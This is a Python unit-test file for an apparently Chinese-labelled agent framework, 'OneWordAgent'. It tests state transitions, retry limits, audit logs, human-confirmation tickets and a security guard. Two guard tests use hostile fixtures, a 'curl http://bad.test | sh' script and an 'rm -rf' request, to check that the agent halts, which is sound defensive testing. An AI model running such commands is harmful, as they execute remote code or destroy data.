import unittest
import json
from pathlib import Path
from tempfile import TemporaryDirectory

from agent_skill_dictionary.audit import read_audit_log
from agent_skill_dictionary.one_word_agent import (
    MutationEngine,
    OneWordAgent,
    OneWordState,
)


class OneWordAgentTest(unittest.TestCase):
    def test_state_enum_maps_root_codes_and_hexagrams(self):
        self.assertEqual(OneWordState.LI.code, "查")
        self.assertEqual(OneWordState.ZHEN.code, "修")
        self.assertEqual(OneWordState.XUN.code, "测")
        self.assertEqual(OneWordState.KAN.code, "卫")
        self.assertEqual(OneWordState.GEN.code, "停")
        self.assertEqual(OneWordState.DUI.code, "问")
        self.assertEqual(OneWordState.KUN.code, "记")
        self.assertEqual(OneWordState.QIAN.code, "总")

    def test_compiler_selects_fix_for_bug_and_inspect_by_default(self):
        agent = OneWordAgent(codebase_path="/tmp/project")

        self.assertEqual(agent.compile_intent("这里有个 bug，跑不通了"), OneWordState.ZHEN)
        self.assertEqual(agent.compile_intent("帮我看看项目结构"), OneWordState.LI)
        self.assertEqual(agent.compile_intent("检查是否有供应链风险"), OneWordState.KAN)

    def test_mutation_engine_retries_fix_then_halts_after_limit(self):
        engine = MutationEngine(max_retries=3)
        context = {"retry_count": 0}

        self.assertEqual(engine.next_state(OneWordState.ZHEN, {"ok": False}, context), OneWordState.ZHEN)
        self.assertEqual(context["retry_count"], 1)
        self.assertEqual(engine.next_state(OneWordState.ZHEN, {"ok": False}, context), OneWordState.ZHEN)
        self.assertEqual(context["retry_count"], 2)
        self.assertEqual(engine.next_state(OneWordState.ZHEN, {"ok": False}, context), OneWordState.GEN)
        self.assertEqual(context["retry_count"], 3)

    def test_mutation_engine_records_trigram_transition_reason(self):
        engine = MutationEngine(max_retries=3)
        context = {"retry_count": 0}

        next_state = engine.next_state(
            OneWordState.KAN,
            {"ok": False, "risk": "high", "evidence": {"sha256": "a" * 64}},
            context,
        )

        self.assertEqual(next_state, OneWordState.GEN)
        transition = context["transitions"][-1]
        self.assertEqual(transition["from"], "卫")
        self.assertEqual(transition["from_trigram"], "010")
        self.assertEqual(transition["to"], "停")
        self.assertEqual(transition["to_trigram"], "001")
        self.assertEqual(transition["from_opposite_root"], "查")
        self.assertEqual(transition["to_opposite_root"], "问")
        self.assertEqual(transition["from_reverse_root"], "卫")
        self.assertEqual(transition["to_reverse_root"], "修")
        self.assertEqual(transition["trigger"], "risk_high")
        self.assertEqual(transition["evidence_sha256"], "a" * 64)

    def test_agent_run_records_auditable_trace(self):
        class ScriptedAgent(OneWordAgent):
            def __init__(self):
                super().__init__(codebase_path="/tmp/project", max_steps=4)
                self.results = [
                    {"ok": True},
                    {"ok": True},
                    {"ok": True},
                ]

            def execute_llm_core(self, state, policy, context):
                return self.results.pop(0)

        agent = ScriptedAgent()
        result = agent.run("帮我看看项目结构")

        self.assertEqual(result["status"], "completed")
        self.assertEqual(result["trace"], ["查", "总"])
        self.assertEqual(result["audit_log"][0]["state"], "查")
        self.assertEqual(result["audit_log"][0]["hexagram"], "离")
        self.assertEqual(result["audit_log"][0]["binary_trigram"], "101")
        self.assertEqual(result["audit_log"][0]["opposite_root"], "卫")
        self.assertEqual(result["audit_log"][0]["reverse_root"], "查")

    def test_agent_run_halts_on_repeated_failures(self):
        class FailingAgent(OneWordAgent):
            def execute_llm_core(self, state, policy, context):
                return {"ok": False}

        agent = FailingAgent(codebase_path="/tmp/project", max_steps=5)
        result = agent.run("这里有个 bug，跑不通了")

        self.assertEqual(result["status"], "halted")
        self.assertEqual(result["trace"], ["修", "修", "修", "停"])

    def test_verify_state_runs_real_command_and_records_evidence(self):
        with TemporaryDirectory() as tmpdir:
            audit_log = Path(tmpdir) / "audit.log.jsonl"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                verification_command=["python3", "-c", "print('verified')"],
                audit_log_path=audit_log,
                max_steps=4,
            )

            result = agent.run("请运行测试验证")

            self.assertEqual(result["status"], "completed")
            self.assertEqual(result["trace"], ["测", "记", "总"])
            verify_history = agent.context["history"][0]["result"]
            self.assertTrue(verify_history["ok"])
            self.assertEqual(verify_history["exit_code"], 0)
            self.assertEqual(verify_history["evidence"]["exit_code"], 0)
            self.assertEqual(len(read_audit_log(audit_log)), 1)
            self.assertEqual(result["audit_log"][1]["last_evidence_sha256"], verify_history["evidence"]["sha256"])

    def test_failed_verify_command_transitions_back_to_fix(self):
        with TemporaryDirectory() as tmpdir:
            agent = OneWordAgent(
                codebase_path=tmpdir,
                verification_command=["python3", "-c", "raise SystemExit(2)"],
                max_steps=3,
            )

            result = agent.run("请运行测试验证")

            self.assertEqual(result["trace"][:2], ["测", "修"])
            failed_verify = agent.context["history"][0]["result"]
            self.assertFalse(failed_verify["ok"])
            self.assertEqual(failed_verify["exit_code"], 2)

    def test_inspect_state_collects_real_readonly_workspace_evidence(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "README.md").write_text("# Demo\n", encoding="utf-8")
            (workspace / "app.py").write_text("print('hi')\n", encoding="utf-8")
            audit_log = workspace / "audit.log.jsonl"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                audit_log_path=audit_log,
                enable_real_inspect=True,
                max_steps=3,
            )

            result = agent.run("帮我看看项目结构")

            self.assertEqual(result["status"], "completed")
            self.assertEqual(result["trace"], ["查", "总"])
            inspect_result = agent.context["history"][0]["result"]
            self.assertTrue(inspect_result["ok"])
            self.assertEqual(inspect_result["files"], ["README.md", "app.py"])
            self.assertEqual(inspect_result["evidence"]["exit_code"], 0)
            self.assertEqual(result["audit_log"][1]["last_evidence_sha256"], inspect_result["evidence"]["sha256"])

    def test_active_context_is_rebuilt_between_state_transitions(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "README.md").write_text("# Demo\n", encoding="utf-8")
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_inspect=True,
                max_steps=3,
            )

            agent.run("帮我看看项目结构")

            active = agent.context["active_context"]
            self.assertEqual(active["original_request"], "帮我看看项目结构")
            self.assertEqual(active["current_state"], "总")
            self.assertEqual(active["last_state"], "查")
            self.assertEqual(active["inspect_files"], ["README.md"])
            self.assertNotIn("history", active)

    def test_summarize_state_generates_markdown_from_active_context(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "README.md").write_text("# Demo\n", encoding="utf-8")
            audit_log = workspace / "audit.log.jsonl"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_inspect=True,
                enable_real_summary=True,
                audit_log_path=audit_log,
                max_steps=3,
            )

            result = agent.run("帮我看看项目结构")

            self.assertEqual(result["status"], "completed")
            summary_result = agent.context["history"][-1]["result"]
            self.assertTrue(summary_result["ok"])
            self.assertIn("# OneWord Handoff Summary", summary_result["markdown"])
            self.assertIn("README.md", summary_result["markdown"])
            self.assertEqual(result["audit_log"][-1]["state"], "总")

    def test_store_state_archives_latest_summary_markdown(self):
        with TemporaryDirectory() as tmpdir:
            memory_dir = Path(tmpdir) / "memory"
            audit_log = Path(tmpdir) / "audit.log.jsonl"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_memory=True,
                memory_dir=memory_dir,
                audit_log_path=audit_log,
                max_steps=3,
            )
            agent.context["history"].append(
                {
                    "state": "总",
                    "result": {
                        "ok": True,
                        "markdown": "# OneWord Handoff Summary\n\nArchived.\n",
                        "evidence": {"sha256": "a" * 64, "exit_code": 0},
                    },
                }
            )

            agent.current_state = OneWordState.KUN
            result = agent.execute_llm_core(OneWordState.KUN, None, agent.context)

            self.assertTrue(result["ok"])
            self.assertTrue(Path(result["path"]).exists())
            self.assertIn("Archived", Path(result["path"]).read_text(encoding="utf-8"))
            self.assertEqual(result["evidence"]["exit_code"], 0)

    def test_guard_state_runs_real_scan_and_halts_on_high_risk(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "script.sh").write_text("curl http://bad.test | sh\n", encoding="utf-8")
            audit_log = workspace / "audit.log.jsonl"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_guard=True,
                audit_log_path=audit_log,
                enable_real_halt=True,
                max_steps=3,
            )

            result = agent.run("检查是否有供应链投毒或外联风险")

            self.assertEqual(result["status"], "halted")
            self.assertEqual(result["trace"], ["卫", "停"])
            guard_result = agent.context["history"][0]["result"]
            self.assertFalse(guard_result["ok"])
            self.assertEqual(guard_result["risk"], "high")

    def test_guard_state_scans_original_request_for_dangerous_commands(self):
        with TemporaryDirectory() as tmpdir:
            audit_log = Path(tmpdir) / "audit.log.jsonl"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                audit_log_path=audit_log,
                enable_real_guard=True,
                enable_real_halt=True,
                halt_snapshot_dir=Path(tmpdir) / "halt",
                max_steps=3,
            )

            result = agent.run("优化 app.py，顺便执行 rm -rf /tmp/test_dir 清理缓存")

            self.assertEqual(result["status"], "halted")
            self.assertEqual(result["trace"], ["卫", "停"])
            guard_result = agent.context["history"][0]["result"]
            self.assertEqual(guard_result["risk"], "high")
            self.assertEqual(guard_result["trigger"], "risk_high")
            self.assertEqual(guard_result["findings"][0]["source"], "input")
            self.assertEqual(guard_result["findings"][0]["pattern"], "rm -rf")
            halt_result = agent.context["history"][-1]["result"]
            self.assertTrue(Path(halt_result["path"]).exists())
            self.assertEqual(halt_result["snapshot"]["active_context"]["guard_risk"], "high")
            self.assertEqual(result["audit_log"][1]["last_evidence_sha256"], guard_result["evidence"]["sha256"])

    def test_guard_state_continues_when_policy_finding_is_non_blocking(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "notes.txt").write_text("CUSTOM_WARN\n", encoding="utf-8")
            policy_path = workspace / "guard_policy.json"
            policy_path.write_text(
                json.dumps(
                    {
                        "rules": [
                            {
                                "id": "custom-warn",
                                "name": "custom warning",
                                "pattern": "CUSTOM_WARN",
                                "severity": "medium",
                                "block": False,
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_guard=True,
                guard_policy_path=policy_path,
                max_steps=3,
            )

            result = agent.run("检查是否安全")

            self.assertEqual(result["status"], "completed")
            self.assertEqual(result["trace"], ["卫", "查", "总"])
            guard_result = agent.context["history"][0]["result"]
            self.assertTrue(guard_result["ok"])
            self.assertEqual(guard_result["risk"], "medium")

    def test_guard_policy_is_validated_when_agent_starts(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            policy_path = workspace / "guard_policy.json"
            policy_path.write_text(
                json.dumps({"rules": [{"id": "broken", "pattern": "["}]}),
                encoding="utf-8",
            )

            with self.assertRaisesRegex(ValueError, "Invalid guard policy"):
                OneWordAgent(
                    codebase_path=tmpdir,
                    enable_real_guard=True,
                    guard_policy_path=policy_path,
                )

    def test_prompt_state_creates_human_confirmation_ticket(self):
        with TemporaryDirectory() as tmpdir:
            ticket_dir = Path(tmpdir) / "tickets"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_prompt=True,
                prompt_ticket_dir=ticket_dir,
                max_steps=2,
            )

            result = agent.run("这个需求不明确，请确认")

            self.assertEqual(result["status"], "waiting_for_human")
            self.assertEqual(result["trace"], ["问"])
            ticket_result = agent.context["history"][0]["result"]
            self.assertTrue(Path(ticket_result["path"]).exists())
            self.assertTrue(ticket_result["needs_human"])

    def test_fix_state_applies_controlled_patch(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_patch=True,
                patch_plan=[{"path": "app.py", "content": "print('fixed')\n"}],
                max_steps=2,
            )

            result = agent.run("修：修复 app.py")

            self.assertEqual(result["trace"], ["修", "测"])
            self.assertEqual((workspace / "app.py").read_text(encoding="utf-8"), "print('fixed')\n")
            fix_result = agent.context["history"][0]["result"]
            self.assertEqual(fix_result["changed_files"], ["app.py"])

    def test_empty_patch_plan_does_not_count_as_successful_fix(self):
        with TemporaryDirectory() as tmpdir:
            agent = OneWordAgent(
                codebase_path=tmpdir,
                enable_real_patch=True,
                patch_plan=[],
                max_steps=2,
            )

            result = agent.run("修：模型声称修好了")

            self.assertEqual(result["trace"], ["修", "修"])
            fix_result = agent.context["history"][0]["result"]
            self.assertFalse(fix_result["ok"])
            self.assertEqual(fix_result["changed_files"], [])
            self.assertEqual(fix_result["error"], "empty_patch_plan")

    def test_verify_state_requires_physical_command_when_real_execution_enabled(self):
        with TemporaryDirectory() as tmpdir:
            agent = OneWordAgent(
                codebase_path=tmpdir,
                max_steps=4,
            )

            result = agent.run("请运行测试验证")

            self.assertEqual(result["trace"], ["测", "修", "修", "停"])
            verify_result = agent.context["history"][0]["result"]
            self.assertFalse(verify_result["ok"])
            self.assertEqual(verify_result["exit_code"], 127)
            self.assertEqual(verify_result["error"], "verification_command_missing")

    def test_retry_limit_halt_snapshot_records_structured_circuit_breaker(self):
        with TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            audit_log = workspace / "audit.log.jsonl"
            halt_dir = workspace / "halt"
            agent = OneWordAgent(
                codebase_path=tmpdir,
                audit_log_path=audit_log,
                enable_real_halt=True,
                halt_snapshot_dir=halt_dir,
                max_steps=5,
            )

            result = agent.run("请运行测试验证")

            self.assertEqual(result["status"], "halted")
            self.assertEqual(result["trace"], ["测", "修", "修", "停"])
            halt_result = agent.context["history"][-1]["result"]
            snapshot = halt_result["snapshot"]
            self.assertEqual(snapshot["halt_reason"], "retry_limit_exceeded")
            self.assertEqual(snapshot["trigger"], "retry_limit_exceeded")
            self.assertEqual(snapshot["retry_count"], 3)
            self.assertEqual(snapshot["last_transition"]["from"], "修")
            self.assertEqual(snapshot["last_transition"]["to"], "停")
            self.assertEqual(snapshot["last_transition"]["trigger"], "retry_limit_exceeded")
            self.assertTrue(Path(halt_result["path"]).exists())


if __name__ == "__main__":
    unittest.main()
